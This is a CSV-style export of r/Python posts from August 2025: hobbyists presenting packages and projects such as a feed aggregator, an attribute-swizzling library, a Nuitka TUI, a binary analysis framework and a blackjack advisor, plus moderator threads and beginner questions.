1mukriv,"My first open-source package: feedunify, a tool for fetching and standardizing data feeds.",CartoonistDouble5057,21,1,2025-08-19 14:55:52,https://www.reddit.com/r/Python/comments/1mukriv/my_first_opensource_package_feedunify_a_tool_for/,"I'm not an expert, but I've been learning a lot and wanted to share my first-ever open-source package. It's called `feedunify`, and I built it to teach myself about async programming, testing, and the whole process of publishing to PyPI.

**What My Project Does**

`feedunify` is a library that fetches and standardizes data from multiple sources. You give it a list of URLs (RSS feeds, YouTube channels, etc.), and it returns a single, clean list of Python objects with a predictable structure.

* Fetches data concurrently using `asyncio` and `httpx`.
* Parses RSS, Atom, and standard YouTube channel URLs.
* Standardizes all data into a clean `FeedItem` object using `pydantic`.
* Has a full test suite built with `pytest`.

**Target Audience**

* Developers or hobbyists building simple data aggregation tools (like a news dashboard or a Discord bot).
* Anyone who wants to learn about `asyncio`, `pydantic`, and Python packaging, as it's a simple, real-world example.
* It's meant as a learning project, not a production-ready framework.

**Comparison**

The closest existing tools are powerful parsers like `feedparser`. `feedunify` is different because it's a higher-level orchestration tool. It uses `feedparser` under the hood but adds the layer of:

* **Concurrent fetching:** Pulls from all sources at once.
* **Source detection:** Automatically distinguishes between a normal RSS feed and a YouTube channel.
* **Data standardization:** Guarantees a single, consistent output schema.

I would really appreciate any feedback or suggestions you have. Thanks for taking a look!

**Links**
* **GitHub:** https://github.com/Rudra-K/feedunify
* **PyPI:** https://pypi.org/project/feedunify/"
1muhw70,Swizzle: flexible multi-attribute access in Python,Additional_Fall4462,21,34,2025-08-19 13:06:10,https://www.reddit.com/r/Python/comments/1muhw70/swizzle_flexible_multiattribute_access_in_python/,"Ever wished you could just do `obj.yxz` and grab all three at once? I got a bit obsessed playing around with `__getattr__` and `__setattr__`, and somehow it turned into a tiny library.

# What my Project Does

Swizzle lets you grab or assign multiple attributes at once, and it works with regular classes, dataclasses, Enums, etc. By default, swizzled attributes return a `swizzledtuple` (like an enhanced `namedtuple`) that keeps the original class name and allows continuous swizzling.

    import swizzle 
    
    # Example with custom separator
    @swizzle(sep='_', setter=True)
    class Person:
        def __init__(self, name, age, city, country):
            self.name = name
            self.age = age
            self.city = city
            self.country = country
    
    p = Person(""Jane"", 30, ""Berlin"", ""Germany"")
    
    # Get multiple attributes with separator
    print(p.name_age_city_country)
    # Person(name='Jane', age=30, city='Berlin', country='Germany')
    
    # Continuous swizzling & duplicates
    print(p.name_age_city_country.city_name_city)
    # Person(city='Berlin', name='Jane', city='Berlin')
    
    # Set multiple attributes at once
    p.country_city_name_age = ""DE"", ""Munich"", ""Anna"", 25
    print(p.name_age_city_country)
    # Person(name='Anna', age=25, city='Munich', country='DE')

Under the hood:

* Trie-based lookup when attribute names are known/fixed (using the `only_attrs` argument)
* Greedy matching when names aren‚Äôt provided
* Length-based splitting when all attribute names have the same length

I started writing this while working with bounding box formats like `xywh`, where I had multiple property methods and wanted a faster way to access them without extra overhead.

# Target Audience

* Python developers who work with classes, dataclasses, or Enums and want cleaner, faster attribute access.
* Data scientists / ML engineers handling structured data objects (like bounding boxes, feature vectors, or nested configs) where repeated attribute access gets verbose.
* Game developers or graphics programmers who are used to GLSL-style swizzling (`vec.xyz`) and want a Python equivalent.
* Library authors who want to provide flexible APIs that can accept grouped or chained attribute access.

# Comparison

|Feature|Standard Python|`swizzle`|
|:-|:-|:-|
|Access multiple attributes|`obj.a, obj.b, obj.c`|`obj.a_b_c`|
|Assign multiple attributes|`obj.a = 1; obj.b = 2; obj.c = 3`|`obj.a_b_c = 1, 2, 3`|
|Namedtuple-like return|‚ùå|‚úî `swizzledtuple`: a namedtuple that supports swizzle access and allows duplicates|

Curious what you think: do you just stick with obj.a, obj.b etc., or could you see this being useful? I‚Äôm also toying with a GLSL-like access mode, where attributes are assigned a fixed order, and any new swizzledtuple created through continuous or repeated swizzling preserves this order. Any feature ideas or use cases would be fun to hear!

Install: `pip install swizzle`

GitHub: [github.com/janthmueller/swizzle](https://github.com/janthmueller/swizzle)"
1mugoi2,UVForge ‚Äì Interactive Python project generator using uv package manager (just answer prompts!),Super_Sign_9198,3,16,2025-08-19 12:13:31,https://www.reddit.com/r/Python/comments/1mugoi2/uvforge_interactive_python_project_generator/,"# What My Project Does

[UVForge](https://github.com/manursutil/uvforge) is a CLI tool that bootstraps a modern Python project in seconds using uv. Instead of writing config files or copying boilerplate, you just answer a few interactive prompts and UVForge sets up:

* `src/` project layout
* `pytest` with example tests
* `ruff` for linting
* optional Docker and Github Actions support
* a clean, ready-to-go structure

# Target Audience

* Beginners and Advanced programmers who want to start coding quickly without worrying about setup.
* Developers who want a **‚Äúcreate-react-app‚Äù experience** for Python.
* Anyone who dislikes dealing with templating syntax or YAML files.

It‚Äôs not meant for production frameworks, it is just a quick, friendly way to spin up well-structured Python projects.

# Comparison

The closest existing tool is **Cookiecutter**, which is very powerful but requires YAML/JSON templates and some upfront configuration. UVForge is different because it is:

* **Fully interactive**: answer prompts in your terminal, no template files needed.
* **Zero config to start**: works out of the box with modern Python defaults.
* **Lightweight**: minimal overhead, just install and run.

Would love feedback from the community, especially on what features or integrations you‚Äôd like to see added!

**Links**  
GitHub: [https://github.com/manursutil/uvforge](https://github.com/manursutil/uvforge)"
1mu9cv8,Substack scraper,promle,0,2,2025-08-19 05:08:07,https://www.reddit.com/r/Python/comments/1mu9cv8/substack_scraper/,"[https://github.com/gitgithan/substack\_scraper](https://github.com/gitgithan/substack_scraper)

**What My Project Does**

Scrapes substack articles into html and markdown

**Target Audience**

Substack Readers¬†

**Comparison**¬†  
[https://github.com/timf34/Substack2Markdown](https://github.com/timf34/Substack2Markdown)  
This tool tries to automate login with user and pass in a config file.  
It also uses user-agent to get around headless problems.

My code is much less lines (100 vs 500), no config or user pass needed which reduces accidents in leaking passwords.  
It requires manually logging in with a headed browser and possibly solving captcha.  
Login is a one-time task only before scraper goes through all the articles, and is much more robust to hidden errors."
1mu8pqh,Can I make games with python?,Temporary-Tip9885,0,16,2025-08-19 04:32:12,https://www.reddit.com/r/Python/comments/1mu8pqh/can_i_make_games_with_python/,I am pretty new to python and I‚Äôve been using gamemaker for a little while and I was wondering if I can code games with python? 
1mu76pd,[Release] Syda ‚Äì Open Source Synthetic Data Generator with AI + SQLAlchemy Support,TerribleToe1251,1,12,2025-08-19 03:14:34,https://www.reddit.com/r/Python/comments/1mu76pd/release_syda_open_source_synthetic_data_generator/,"I‚Äôve released **Syda**, an open-source Python library for generating **realistic, multi-table synthetic/test data**.

Key features:

* **Referential Integrity** ‚Üí no orphaned records (`product.category_id ‚Üí` [`category.id`](http://category.id) `‚úÖ`)
* **SQLAlchemy Native** ‚Üí generate synthetic data from your ORM models directly
* **Multiple Schema Formats** ‚Üí YAML, JSON, dicts also supported
* **Custom Generators** ‚Üí define business logic (tax, pricing, rules)
* **Multi-AI Provider** ‚Üí works with OpenAI, Anthropic (Claude), others

üëâ GitHub: [https://github.com/syda-ai/syda](https://github.com/syda-ai/syda)  
üëâ Docs: [https://python.syda.ai/](https://python.syda.ai/)  
üëâ PyPI: [https://pypi.org/project/syda/](https://pypi.org/project/syda/)

Would love feedback from Python devs 

  


"
1mu3v7x,M.I.L.O - My Financial Analysis Tool,HugeRecommendation53,0,6,2025-08-19 00:42:57,https://www.reddit.com/r/Python/comments/1mu3v7x/milo_my_financial_analysis_tool/,"Pretty new to python, so I ended up spending about a day or so on thisüòÇ. How's it look? Any advice or pro tips for how to next tackle this? Pretty open to anything.



    import pandas as pd
    import os as os
    import shutil as shutil

`def menu():`

`print(""üí∏ Hi I'm M.I. L. O  - Your Personal Finance Analysis üí∏"")`

`print(""1. üìä View Financial Analysis"")`

`print(""2. üí∏ Upload New Statement"")`

`print(""3. üíº Set Budget"")`

`print(""4. üìà View/ Export Reports"")`

`print(""5. üõ†Ô∏è Settings"")`

`print(""6. üö™ Exit"")`

`# Add an option to exit the program`

`choice = input(""üí¨ Enter your choice: "")`

`return choice`

`def cleanData():`

`df = pd.read_csv(""milo/data/statement.csv"")`

`df.columns = ['Date','Amount','Indicator','Type','Description','Category']`

`df['Date'] = pd.to_datetime(`

`df['Date'], errors='coerce', format='%m/%d/%Y'`

`).fillna(pd.to_datetime(df['Date'], errors='coerce'))`   

`df['Amount'] = pd.to_numeric(`

`df['Amount'].astype(str).str.replace(',', '').str.strip(),`

`errors='coerce').fillna(0)`   

`df['Indicator'] = df['Indicator'].astype(str).str.strip().str.lower()`

`df['Category'] = df['Category'].astype(str).fillna('Uncategorized').replace({'nan':'Uncategorized'})`

`df = df.dropna(subset=['Date'])`

`return df`





`def financialAnalyisInnerMenu():`

`prompt = input(`

`""üìÖ Enter a month to filter data (e.g., 2025-06), or press Enter to use all data: ""`

`)`

`return prompt`

`def financialAnalysis(df):`

`debit = df[df['Indicator'] == 'debit']`

`credit = df[df['Indicator'] == 'credit']`

`income = credit['Amount'].sum()`

`expenses = debit['Amount'].sum()`

`net = income - expenses`

`print(f""\nüí∞ Total Income:   ${income:,.2f}"")`

`print(f""üí∏ Total Spending: ${expenses:,.2f}"")`

`print(f""üßæ Net Balance:    ${net:,.2f}"")`

`top_spending = (debit.groupby('Category')['Amount']`

`.sum().sort_values(ascending=False).head(5))`

`print(""\nüìà Top Spending Categories:"")`

`if top_spending.empty:`

`print(""  (no debit transactions)"")`

`else:`

`for cat, amt in top_spending.items():`

`print(f""  - {cat}: ${amt:,.2f}"")`

`monthly_spending = (debit.groupby(debit['Date'].dt.to_period('M'))['Amount']`

`.sum().sort_index())`

`print(""\nüìÖ Monthly Spending (debits):"")`

`if monthly_spending.empty:`

`print(""  (no debit transactions)"")`

`else:`

`for period, amt in monthly_spending.items():`

`print(f""  - {period}: ${amt:,.2f}"")`

`monthly_category_spending = (`

`debit.groupby([debit['Date'].dt.to_period('M'), 'Category'])['Amount']`

`.sum().unstack(fill_value=0).sort_index()`

`)`

`print(""\nüìÖ Monthly Spending by Category (debits):"")`

`if monthly_category_spending.empty:`

`print(""  (no debit transactions)"")`

`else:`

`print(monthly_category_spending)`



`def uploadStatement(source_path, destination_folder):`

`print(""üìÇ Uploading new statement..."")`

`if not os.path.isfile(source_path):`

`print(""‚ö†Ô∏è File not found."")`

`return`

`if not os.path.exists(destination_folder):`

`os.makedirs(destination_folder)`

`print(f""üìÇ Created folder: {destination_folder}"")`

`file_name = os.path.basename(source_path)`

`destination_path = os.path.join(destination_folder, file_name)`

`shutil.copy(source_path, destination_path)`

`print(f""üìÇ File uploaded to: {destination_path}"")`

`print(""üìÇ Upload complete."")`

`return destination_path`

`def main():`

`while True:`

`choice = menu()`

`if choice == '1':`

`print(""üìä Viewing Financial Analysis..."")`

`df = cleanData()`

`prompt = financialAnalyisInnerMenu()`

`if prompt:`

`try:`

`selected_month = pd.Period(prompt, freq='M')`

`df = df[df['Date'].dt.to_period('M') == selected_month]`

`except:`

`print(""‚ö†Ô∏è Invalid month format. Showing all data."")`

`financialAnalysis(df)`

                elif choice == '2':

`path = input(""üì§ Enter path to your new CSV statement: "")`

`uploadStatement(path, ""milo/data"")`

`elif choice == '3':`

`print(""üíº Budget setting coming soon!"")`

`elif choice == '4':`

`print(""üìà Export/report feature coming soon!"")`

`elif choice == '5':`

`print(""üõ†Ô∏è Settings menu coming soon!"")`

`elif choice == '6':`

`print(""üëã Exiting M.I.L.O. Stay smart with your money!"")`

`break`

`else:`

`print(""‚ùå Invalid choice. Please enter a number from 1‚Äì6."")`



`if __name__ == ""__main__"":`

`main()`"
1mu2vyt,Tuesday Daily Thread: Advanced questions,AutoModerator,8,4,2025-08-19 00:00:30,https://www.reddit.com/r/Python/comments/1mu2vyt/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1mtxd3l,(êëíêë≥êë•êëêêë≤êë§) / Cumpyl - Python binary analysis and rewriting framework (Unlicense),umpolungfishtaco,0,12,2025-08-18 20:22:20,https://www.reddit.com/r/Python/comments/1mtxd3l/êëíêë≥êë•êëêêë≤êë§_cumpyl_python_binary_analysis_and/,"[https://github.com/umpolungfish/cumpyl-framework?tab=readme-ov-file](https://github.com/umpolungfish/cumpyl-framework?tab=readme-ov-file)

(Unlicense)

\*uv install has been added\*

What My Project Does

Cumpyl is a comprehensive Python-based binary analysis and rewriting framework that transforms complex binary manipulation into an accessible, automated workflow. It analyzes, modifies, and rewrites executable files (PE, ELF, Mach-O) through:

* Intelligent Analysis: Plugin-driven entropy analysis, string extraction, and section examination
* Guided Obfuscation: Color-coded recommendations for safe binary modification with tier-based safety ratings
* Batch Processing: Multi-threaded processing of entire directories with progress visualization
* Rich Reporting: Professional HTML, JSON, YAML, and XML reports with interactive elements
* Configuration-Driven: YAML-based profiles for malware analysis, forensics, and research workflows

Target Audience

Primary Users

* Malware Researchers: Analyzing suspicious binaries, understanding packing/obfuscation techniques
* Security Analysts: Forensic investigation, incident response, threat hunting
* Penetration Testers: Binary modification for evasion testing, security assessment
* Academic Researchers: Binary analysis studies, reverse engineering education

Secondary Users

* CTF Players: Reverse engineering challenges, binary exploitation competitions
* Security Tool Developers: Building custom analysis workflows, automated detection systems
* Incident Response Teams: Rapid binary triage, automated threat assessment

Skill Levels

* Beginners: Guided workflows, color-coded recommendations, copy-ready commands
* Intermediate: Plugin customization, batch processing, configuration management
* Advanced: Custom plugin development, API integration, enterprise deployment

Comparison

|Feature|Cumpyl|IDA Pro|Ghidra|Radare2|LIEF|Binary Ninja|
|:-|:-|:-|:-|:-|:-|:-|
|Cost|Free|$$$$|Free|Free|Free|$$$|
|Learning Curve|Easy|Steep|Steep|Very Steep|Moderate|Moderate|
|Interface|Rich CLI + HTML|GUI|GUI|CLI|API Only|GUI|
|Batch Processing|Built-in|Manual|Manual|Scripting|Custom|Manual|
|Reporting|Multi-format|Basic|Basic|None|None|Basic|
|Configuration|YAML-driven|Manual|Manual|Complex|Code-based|Manual|
|Plugin System|Standardized|Extensive|Available|Complex|None|Available|
|Cross-Platform|Yes|Yes|Yes|Yes|Yes|Yes|
|Binary Modification|Guided|Manual|Manual|Manual|Programmatic|Manual|
|Workflow Automation|Built-in|None|None|Scripting|Custom|None|

Edit: typo, uv install update"
1mttoh3,*Noobie* My Second Project?,zArijz,0,7,2025-08-18 18:08:02,https://www.reddit.com/r/Python/comments/1mttoh3/noobie_my_second_project/,"Hi all, back again lol.

I've just finished off my second project. It's an advisor app created to target online gamblers who play live blackjack games.

**It looks like**¬†[**this.**](https://imgur.com/a/oiIusMA)

It Includes:

* üéØ¬†**Accurate Strategy Guidance**¬†‚Äì Get optimal plays based on proven blackjack strategy.
* üîÑ¬†**Supports Splits & Multiple Hands**¬†‚Äì Even accounts for advanced scenarios like splitting 10s, Jacks, Queens, and Kings.
* üíª¬†**Running Count**¬†‚Äì Has an automatic running count doing the hard work for you.
* üö®¬†**Bust Detection**¬†‚Äì Automatically alerts you when your hand or the dealer‚Äôs goes over 21.
* üé®¬†**Clean & Color-Coded Interface**¬†‚Äì Advice is shown in bold, easy-to-read color cues (Green for Hit, Blue for Stand, Gold for Split, Red for Bust).
* üîë¬†**Secure Access System**¬†‚Äì License-key protected software ensures only authorized users can access the program.
* üíª¬†**Lightweight & Portable**¬†‚Äì Distributed as a single¬†`.exe`¬†file ‚Äî no installation hassle, works right out of the box.

**I found this project a lot harder than the first one I made**¬†[**here**](https://www.reddit.com/r/Python/comments/1miuohk/noobie_created_my_first_app_today/)**.**

One of the more challenging things I found here was the amount of different things I'd have to make work all together initially. Every time I updated the main app script, I would have to update both the backend (whilst I was using this option for key verification, scrapped it later), and the launcher file. Instead of having all of these working together, I decided to change it to the main app having everything. The launcher file was originally made mainly to serve as a gate to access for the app. I later removed this file completely and added it to the main app instead. Key verification was also a little tricky.

Originally, for the key verification, I was using a Remote Licence Verification system using a server on render. My App Would send Key to render server -> Render server had the secret key to decrypt -> would send back if it was true or not. I had 2 major issues with this. Firstly, if it was in practical use, the server would have to have communication with the app once every 15 minutes to stop it falling asleep. Secondly, for some reason, the script I wrote to generate keys (it was a mass gen, so it would let me input the amount I needed), it would only give me about half of the keys as usable. The rest would not verify for some reason. I then switched to public and private pem files which I found suited my cause a lot easier. Not had any issue with any genned keys not working, and it keeps the monetisation of this project as safe as it can be at my current knowledge level.

Another issue I was having was with logical outputs. One thing I couldn't manage to crack was a ""Blackjack Detection"" feature. I tried to rewrite this almost 12 times and in the end could not wrap my head around it. I tried using StringVar, which I'm not too confident with, and couldn't manage to get it to work. My implementation was not recognizing the values as expected in logical operations which led to me passing on this feature.

I also really struggled with designing UI. I tried to give CustomTkinter a shot, but I'm still learning about it and don't want to take more than 14 days on each project so I can see the growth in my learning over 6 months. I ended up leaving it a simple tkinter UI, but hopefully over the coming projects it's something I can give more thought too and improve on.

The final thing I really struggled with was adding the ""soft"" aces logic. This took a while. Originally, it would continuously add the aces together as 11, so a pair of aces on the first hand would equate to a bust, which is not right of course. It then messed with the running count as well as it was adding a count each time an ace came out. So if there was 3 aces on the table - it should be a -3 count. Instead it was a -6, as for whatever reason the first would count as -1, the second as -2, and the third as -3. I managed to fix this after a couple of hours of pulling out my hair by making ace act as simultaneous values as opposed to a single value appointed. Updating the running count to being constantly flowing also fixed my issue of it adding count when it came to aces too.

I didn't add a true count option based on the fact that I was running out of time, and that a lot of online casinos use a different shoe amount and just wouldn't have the time to implement this within my 14 days.

**There were things that were innately easier for me this time around:**

I managed to add multiple hand support, and split support fairly simply. I had no issues with the multiple hand support, the first write nailed it pretty much. The split support took me maybe 3-4 writes, but it was more of things I was naively missing as opposed to problems I struggled to solve. Especially when it came to splitting Ace due to ""soft ace"" logic which I've already spoke about. The running count was also something I initially managed to get done pretty easily, this took me maybe 5 writes because I was found that every time I cleared the inputs for the next round, running count would reset too. I fixed this fairly easily. Adding dealer and player bust logic was also something I nailed first time. I had to tweak it slightly as I ended up adding colour which I made a little error in that made me have to fix. I also implemented a ""New Shoe"" feature that can be pressed when shoes are changed. This basically just reset running count.

Any next step tips to look at or things that might be of interest to me are always appreciated. My next product most likely is going to be heavily cryptography and security based as I'm interested in that. Any suggestions on things to research for that is appreciated! I'm mainly building real use case things that people can use day-to-day so any suggestions on what to build next is also appreciated, I'm sticking to industries I enjoy; gaming, gambling, crypto, and business-esc solutions.

I know PyQT is something that I can use for better UI design, defo gonna try this in my next project.

If anyone wants access to or wants to test my app, please shoot me a message. I'm trying to market it a bit online to put some change in my pocket for future projects so do keep this in mind.

[Here's a link to a video of the app in function.](https://www.youtube.com/watch?v=xJ-Moa8tWF4)"
1mtr07d,"AI-based Synology Photos ""lost folder"" Thumbnails Generator",stibbons_,0,1,2025-08-18 16:31:49,https://www.reddit.com/r/Python/comments/1mtr07d/aibased_synology_photos_lost_folder_thumbnails/,"Synology Photos works with my deeply hierarchical Photo structure, but does not create a thumbnail for all intermediates folders, the ones that does not contain at least one picture directly in it.

So I wrote this Python project that generate thumbnails in all parents folder without one.

**What My Project Does**

For instance, my collections are organized like this:

    /volume3/photo
    ‚îú‚îÄ‚îÄ Famille/2025/25.08 - Vacation in My Hometown
    ‚îú‚îÄ‚îÄ Professional/2024/24.04 - Marketing Campaign
    ‚îî‚îÄ‚îÄ Personal/2023/23.02 - Hiking in Pyrenees

All intermediate levels (`/volume3/photo/Family`,¬†`/volume3/photo/Family/2023`,...) does NOT have a thumbnail generated by Synologys Photos, and appear like ""empty folder"".

Using this program from the top level (ex:¬†`/volume3/photo/`), a¬†`thumbnail.jpeg`will be generated in every intermediate levels.

That was the starting point, from here i played a little bit with some AI model:

* Recursively scans a folder for photos and videos
* Uses Opensource AI models (using openCLIP) to pick four representative images (with optional randomness)
* Crops them to a uniform aspect ratio, centering on people at best as possible (openCV, mediapipe models)
* Assembles them into a 2√ó2 collage
* Saves it as¬†`thumbnail.jpg`in each intermediate folders

I know it is a big script to solve a very small problem, but i like using the Folder view in Synology Photo and have meaningful thumbnail to understand better the content of my hierarchy.

The way it works internally:

* for every folder it needs to generate a thumbnail, list all supported images underneath (any level of folders are supported, images and video)
* we have 4 tiles, so split the list of images into 4 subset
* in each, take 5 randomly
* uses a locally executed AI model to annotate each candidate and try to rank them by ""interestingness""
* on the highest, create a square tile from it, centering on the eye of the person in photo, on trying to maximize the group photo, centering the eyes at \~2/3 of the tile)
* generate a 2x2 collage
* continue

i think the code it pretty dull for the moment, half of it has been generated with chatgpt or copilot. but it is amazing to tell the problem to an AI to change some parameter and it changes it almost correctly.

What i found is that after a while, the AI changes too much of the existing feature set (it ""diverges""). but if the problem if splitted into smaller issue, like ""function to center the eye at 2/3 in vertical"", every AI outputs something interesting. But it is not ready to code everything from scratch alone.

Now, I need to split the code in several files, add unit tests and maybe generate a real python package.

Hope some of you will find it interesting, do not hesitate to comment, test it and provide positive feedback !

**Target Audience**

This project is a little demo of a self-contained script (thanks using uv) while still using some advanced AI model running locally. it works for CPU execution, CUDA or other HW acceleration might not work however, i have not tested it yet.

**Comparison**

Sorry but i did not found a thumbnail generation script or tools that is:

* free and opensource
* generate only for parent folder of my synology

Link to my project:¬†[https://github.com/gsemet/generate-synology-folder-thumbnail](https://github.com/gsemet/generate-synology-folder-thumbnail)"
1mtqvl6,How to tell if this repository is malicious?,NekoNoNakuKoro,0,10,2025-08-18 16:27:10,https://www.reddit.com/r/Python/comments/1mtqvl6/how_to_tell_if_this_repository_is_malicious/,"https://github.com/wasifijaz/BlackJack-Bot

I ran it and it didn't appear to do anything. I'm now worried my computer is getting encrypted or something. Help?"
1mtivrf,A high-level Cloudflare Queues consumer library for Python,jpjacobpadilla,15,0,2025-08-18 11:03:44,https://www.reddit.com/r/Python/comments/1mtivrf/a_highlevel_cloudflare_queues_consumer_library/,"Hey everyone,

I built a high-level Python-based Cloudflare queue consumer package!

Cloudflare has some great products with amazing developer experiences. However, their architecture is primarily built on the V8 runtime, which means their services are optimized for JavaScript.

They do have a beta version of their Workers for Python, but it doesn‚Äôt support some key packages that I need for an application I‚Äôm working on. So, I decided to build CFQ, to provide an easy interface for consuming messages from Cloudflare Queues in Python environments.

# What My Project Does

Lets you easily consume messages from a Cloudflare queue in pure Python environments.

# Comparison

I couldn‚Äôt find many alternatives, which is why I created this package. The only other option was to use Cloudflare‚Äôs Python SDK, which is more low-level.

# Target Audience

  
Developers who want to consume messages from a Cloudflare queue but can‚Äôt directly bind a Python-based Worker to the queue.

  
Github: [https://github.com/jpjacobpadilla/cfq](https://github.com/jpjacobpadilla/cfq)

  
Hope some of you also find it useful!"
1mtiihx,PyNDS: A Python Wrapper for the Nintendo DS Emulator,unexploredtest,23,4,2025-08-18 10:43:39,https://www.reddit.com/r/Python/comments/1mtiihx/pynds_a_python_wrapper_for_the_nintendo_ds/,"Source code: [https://github.com/unexploredtest/PyNDS](https://github.com/unexploredtest/PyNDS)

**What My Project Does**

PyNDS is a library that wraps a Nintendo DS emulator, NooDS, using nanobind. It is inspired by PyBoy, allowing you to interact with the emulator through code. (although it's a lot slower than PyBoy). It provides methods to advance frames, insert both joystick and touch input, create save states, and render the game in a window.

**Target Audience**  
This project is aimed at developers who want to build bots or reinforcement learning agents. However, it is not ready and may contain some bugs or issues, not to mention the lack of documentation. If there's enough interest, I might polish it

**Comparison**  
As far as I have searched, there is no Python library that provides an interface to a Nintendo DS emulator or a Nintendo DS emulator in Python.

Feedback is greatly appreciated."
1mtgpa3,UV python image building does not seem to be completely in sync with python releases,mortenb123,0,7,2025-08-18 08:56:42,https://www.reddit.com/r/Python/comments/1mtgpa3/uv_python_image_building_does_not_seem_to_be/,"Had a pipeline errors this weekend because of:

\`\`\`

1.615 error: No download found for request: cpython-3.13.7-linux-x86\_64-gnu

\`\`\`

local testing:

\`\`\`

uv python install 3.13.7 -v    

DEBUG uv 0.8.11 (f892276ac 2025-08-14)

DEBUG Acquired lock for \`C:\\Users\\mobj\\AppData\\Roaming\\uv\\python\`

DEBUG Released lock at \`C:\\Users\\mobj\\AppData\\Roaming\\uv\\python\\.lock\`

error: No download found for request: cpython-3.13.7-windows-x86\_64-none



uv python install 3.13.6 -v

DEBUG uv 0.8.11 (f892276ac 2025-08-14)

DEBUG Acquired lock for \`C:\\Users\\mobj\\AppData\\Roaming\\uv\\python\`

DEBUG No installation found for request \`3.13.6 (cpython-3.13.6-windows-x86\_64-none)\`

DEBUG Found download \`cpython-3.13.6-windows-x86\_64-none\` for request \`3.13.6 (cpython-3.13.6-windows-x86\_64-none)\`

DEBUG Using request timeout of 30s

DEBUG Downloading [https://github.com/astral-sh/python-build-standalone/releases/download/20250814/cpython-3.13.6%2B20250814-x86\_64-pc-windows-msvc-install\_only\_stripped.tar.gz](https://github.com/astral-sh/python-build-standalone/releases/download/20250814/cpython-3.13.6%2B20250814-x86_64-pc-windows-msvc-install_only_stripped.tar.gz)

DEBUG Extracting cpython-3.13.6-20250814-x86\_64-pc-windows-msvc-install\_only\_stripped.tar.gz to temporary location: C:\\Users\\mobj\\AppData\\Roaming\\uv\\python\\.temp\\.tmpWQNy1c

Downloading cpython-3.13.6-windows-x86\_64-none (download) (20.1MiB)                                                                                                                             

\`\`\`

So they build on the same day but too early, it seems, and nobody bothered checking:  
[https://github.com/astral-sh/python-build-standalone/releases/tag/20250814](https://github.com/astral-sh/python-build-standalone/releases/tag/20250814)

  
In 5 years I've never had this issue with pyenv, we are usually 1 day behind.



"
1mteev1,Tuitka - A TUI for Nuitka,DivineSentry,34,7,2025-08-18 06:32:35,https://www.reddit.com/r/Python/comments/1mteev1/tuitka_a_tui_for_nuitka/,"Hi folks, I wanted to share a project I've been working on in my free time -¬†**Tuitka**

# What My Project Does

Tuitka simplifies the process of compiling Python applications into standalone executables by providing an intuitive TUI instead of wrestling with complex command-line flags.

Additionally, Tuitka does a few things differently than Nuitka. We will use your requirements.txt, pyproject.toml or PEP 723 metadata, and based on this, we will leverage¬†`uv`¬†to create a clean environment for your project and run it only with the dependencies that the project might need.

# Target Audience

This is for Python developers who need to distribute their applications to users who don't have Python installed on their systems.

# Installation & Usage

You can download it via¬†`pip install tuitka`

**Interactive TUI mode:**

    tuitka

  
Since most people in my experience¬†*just*¬†want their executables packaged into onefile or standalone, I've decided to allow you to point directly at the file you want to compile:**Direct compilation mode:**

    tuitka my_script.py

The direct mode automatically uses sensible defaults:

* `--onefile`¬†(single executable file)
* `--assume-yes-for-downloads`¬†(auto-downloads plugins)
* `--remove-output`¬†(cleans up build artifacts)

# Why PEP 723 is Preferred

When you're working in a development environment, you often accumulate libraries that aren't actually needed by your specific script - things you installed for testing, experimentation, or other projects that might have been left laying around.

Nuitka, due to how it works, will try to bundle everything it finds in your dependency list, which can pull in unnecessary bloat and make your executable much larger than it needs to be.

    # /// script
    # dependencies = [""requests"", ""rich""]  # Only what this script uses
    # ///
    
    import requests
    from rich.console import Console
    # ... rest of your script

With PEP 723 inline metadata, you explicitly declare only what that specific script actually needs.

GitHub:¬†[https://github.com/Nuitka/Tuitka](https://github.com/Nuitka/Tuitka)"
1mtcqe4,Regarding Sets in Algorithmic thinking,AbsurdNeuron,0,3,2025-08-18 04:54:36,https://www.reddit.com/r/Python/comments/1mtcqe4/regarding_sets_in_algorithmic_thinking/,"Hey guys, in my python class our faculty asked us few questions regarding sets. And i couldn't find proper answer to these questions. I mean i don't understand how logic and sets are analogous? And also our prof it was saying that set theory is fundamental to algorithmic thinking! Bit honestly i don't understand how and why ?

""How do the core operations of set theory (Union, Intersection, Complement) serve as a direct physical manifestation of the core operations in formal logic
(OR, AND, NOT)?
You must clearly define each pair of operations (e.g., Union and OR) and explain how they are analogous. You may use a Venn diagram to illustrate one of your points.

Explain why the theoretical connection you described earlier is so important for algorithm development and computer programming. Specifically, address the following:

From a programmer's perspective, what are the main advantages of using a built-in set data type? Discuss its benefits in terms of both efficiency and code readability."" "
1mt6qhc,Monday Daily Thread: Project ideas!,AutoModerator,6,1,2025-08-18 00:00:33,https://www.reddit.com/r/Python/comments/1mt6qhc/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
